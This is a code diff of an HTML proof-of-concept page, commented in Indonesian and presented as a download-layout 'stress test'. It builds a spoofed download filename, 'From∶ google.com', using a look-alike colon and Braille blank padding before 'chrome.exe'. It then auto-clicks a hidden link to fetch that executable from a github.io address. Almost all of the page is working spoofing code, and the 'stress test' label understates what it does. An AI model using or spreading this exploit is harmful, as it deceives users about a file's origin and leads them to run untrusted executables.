@@ -3,20 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Layout Exhaustion Test</title>
+    <title>Advanced Download UI Layout PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .card {
+            background-color: #1e293b;
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 440px;
+            width: 100%;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #38bdf8;
+        }
+        p {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        button {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s, transform 0.1s;
+            margin-bottom: 10px;
+        }
+        button:hover {
+            background-color: #1d4ed8;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #64748b;
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 8px;
+            word-break: break-all;
+            text-align: left;
+            border: 1px solid #334155;
+        }
+    </style>
 </head>
 <body>
-    <h2>Download Layout Stress Test</h2>
-    <button onclick="triggerStressTest()">Uji Dorongan Baris Vertikal</button>
+
+    <div class="card">
+        <h2>Download UI Layout Stress Test</h2>
+        <p>Uji coba injeksi karakter Unicode dan padding berat untuk menguji batas ketahanan penanganan string antarmuka.</p>
+        
+        <button onclick="triggerPayload(1)">Uji 1: Standar Ratio & Braille Blank</button>
+        <button onclick="triggerPayload(2)">Uji 2: Heavy Padding Exhaustion</button>
+
+        <div id="status" class="status">Status: Menunggu eksekusi...</div>
+    </div>
 
     <script>
-        function triggerStressTest() {
-            // Menggunakan kombinasi U+2800 (Braille Blank) berulang kali 
-            // untuk memaksa alokasi baris vertikal yang masif pada komponen UI.
-            const verticalPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
-            const craftedFilename = "From∶ google.com" + verticalPadding + "chrome.exe";
-            
+        function updateStatus(msg, filename) {
+            document.getElementById('status').innerHTML = `<strong>Status:</strong> ${msg}<br><strong>Payload:</strong> <span style="color:#38bdf8">${filename}</span>`;
+        }
+
+        function triggerPayload(type) {
             const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
+            let craftedFilename = "";
+
+            if (type === 1) {
+                // Skenario 1: Karakter Unicode tiruan (U+2236 & U+2800)
+                craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
+                updateStatus("Memicu Payload Skenario 1...", craftedFilename);
+            } else if (type === 2) {
+                // Skenario 2: Padding ekstrem untuk menguji batas layout vertikal
+                const heavyPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
+                craftedFilename = "From∶ google.com" + heavyPadding + "chrome.exe";
+                updateStatus("Memicu Payload Skenario 2 (Heavy Padding)...", craftedFilename);
+            }
 
             const link = document.createElement('a');
             link.href = targetUrl;
@@ -24,12 +104,18 @@
             link.style.display = 'none';
 
             document.body.appendChild(link);
-            link.click();
+
+            try {
+                link.click();
+            } catch (err) {
+                updateStatus("Gagal memicu: " + err.message, craftedFilename);
+            }
 
             setTimeout(() => {
                 document.body.removeChild(link);
-            }, 500);
+            }, 1000);
         }
     </script>
+
 </body>
 </html>
